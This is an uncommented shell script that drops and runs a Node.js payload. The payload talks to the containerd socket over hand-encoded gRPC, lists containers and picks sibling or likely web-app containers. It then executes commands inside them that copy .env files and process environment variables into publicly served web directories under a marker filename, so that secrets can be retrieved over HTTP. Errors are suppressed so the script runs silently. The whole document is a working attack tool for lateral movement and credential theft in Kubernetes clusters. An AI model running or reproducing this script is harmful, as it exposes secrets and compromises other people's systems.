#!/bin/sh
cat > /tmp/e.js <<'JSEOF'
const http2=require('http2'),net=require('net'),fs=require('fs');
const SOCK=['/run/k3s/containerd/containerd.sock','/run/containerd/containerd.sock'].find(p=>{try{fs.statSync(p);return true}catch(e){return false}})||'/run/k3s/containerd/containerd.sock';
function vb(n){const a=[];do{let x=n%128;n=Math.floor(n/128);if(n)x+=128;a.push(x)}while(n);return Buffer.from(a)}
function T(f,w){return vb(f*8+w)}
function S(f,s){const b=Buffer.from(String(s));return Buffer.concat([T(f,2),vb(b.length),b])}
function V(f,n){return Buffer.concat([T(f,0),vb(n)])}
function FR(m){const h=Buffer.alloc(5);h.writeUInt32BE(m.length,1);return Buffer.concat([h,m])}
function F(b){const o=[];let i=0;while(i<b.length){let k=0,s=0,c;do{c=b[i++];k+=(c&127)*2**s;s+=7}while(c&128);const f=k>>3,w=k&7;if(w===0){let x=0,s2=0;do{c=b[i++];x+=(c&127)*2**s2;s2+=7}while(c&128);o.push([f,w,x])}else if(w===2){let l=0,s2=0;do{c=b[i++];l+=(c&127)*2**s2;s2+=7}while(c&128);o.push([f,w,b.subarray(i,i+l)]);i+=l}else if(w===1){o.push([f,w,b.subarray(i,i+8)]);i+=8}else if(w===5){o.push([f,w,b.subarray(i,i+4)]);i+=4}else break}return o}
const g=(a,f,w)=>a.find(x=>x[0]===f&&x[1]===w);
const TOK='z7q4m2';
(async()=>{
 const c=http2.connect('http://containerd',{createConnection:()=>net.connect(SOCK)});
 c.on('error',()=>process.exit(0));
 const call=(p,m)=>new Promise(res=>{let d=false;const to=setTimeout(()=>{if(!d){d=true;res({ms:[]})}},8000);const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc','te':'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('error',()=>{if(!d){d=true;clearTimeout(to);res({ms:[]})}});r.on('end',()=>{if(d)return;d=true;clearTimeout(to);const b=Buffer.concat(ch);let i=0;const ms=[];while(i+5<=b.length){const l=b.readUInt32BE(i+1);i+=5;ms.push(b.subarray(i,i+l));i+=l}res({ms})});r.end(FR(m))});
 const lr=await call('/runtime.v1.RuntimeService/ListContainers',Buffer.alloc(0));
 const cs=[];
 for(const m of lr.ms||[]) for(const [f,w,d] of F(m)) if(f===1&&w===2){
   const x=F(d), id=g(x,1,2), sb=g(x,2,2), md=g(x,3,2), st=g(x,6,0);
   let name=''; if(md){const q=g(F(md),1,2); if(q) name=q.toString()}
   if(id) cs.push({id:id.toString(),sb:sb?sb.toString():'',name,state:st?st[2]:1});
 }
 let me='';
 try{const t=fs.readFileSync('/proc/self/cgroup','utf8');for(const h of t.match(/[0-9a-f]{64}/g)||[]) if(cs.some(x=>x.id===h)){me=h;break}}catch(e){}
 const mine=cs.find(x=>x.id===me);
 let tg=[];
 if(mine) tg=cs.filter(x=>x.sb===mine.sb&&x.id!==mine.id&&x.state!==2);
 if(!tg.length){
   try{
     const sr=await call('/runtime.v1.RuntimeService/ListPodSandbox',Buffer.alloc(0));
     const sbx=[];
     for(const m of sr.ms||[]) for(const [f,w,d] of F(m)) if(f===1&&w===2){
       const x=F(d), id=g(x,1,2), md=g(x,2,2);
       let name=''; if(md){const q=g(F(md),1,2); if(q) name=q.toString()}
       if(id) sbx.push({id:id.toString(),name});
     }
     const hn=process.env.HOSTNAME||'';
     const s=sbx.find(x=>x.name===hn);
     if(s) tg=cs.filter(x=>x.sb===s.id&&x.id!==me&&x.state!==2);
   }catch(e){}
 }
 if(!tg.length) tg=cs.filter(x=>x.id!==me&&x.state!==2&&/^(app|web|next|frontend|server)$/i.test(x.name)).slice(0,4);
 const sc2='for d in /app/public /usr/src/app/public /home/node/app/public /opt/app/public /app/.next/static /usr/src/app/.next/static /tmp; do mkdir -p "$d" 2>/dev/null; for e in /app/.env /usr/src/app/.env /home/node/app/.env /opt/app/.env; do [ -f "$e" ] && cp "$e" "$d/'+TOK+'.env.txt"; done; [ -r /proc/1/environ ] && cp /proc/1/environ "$d/'+TOK+'.environ.bin"; { id; pwd; hostname; ls -la /app /usr/src/app; } > "$d/'+TOK+'.diag" 2>&1; done';
 for(const shell of ['/bin/sh','sh','/bin/bash']) for(const x of tg.slice(0,4)){
   try{await call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([S(1,x.id),S(2,shell),S(2,'-c'),S(2,sc2),V(3,8)]))}catch(e){}
 }
 try{c.close()}catch(e){}
 process.exit(0);
})().catch(()=>process.exit(0));
setTimeout(()=>process.exit(0),22000);
JSEOF
N=$(command -v node 2>/dev/null)
if [ -z "$N" ]; then for p in /usr/local/bin/node /usr/bin/node /opt/node/bin/node /app/node_modules/.bin/node; do [ -x "$p" ] && N="$p"; done; fi
[ -z "$N" ] && exit 0
"$N" /tmp/e.js
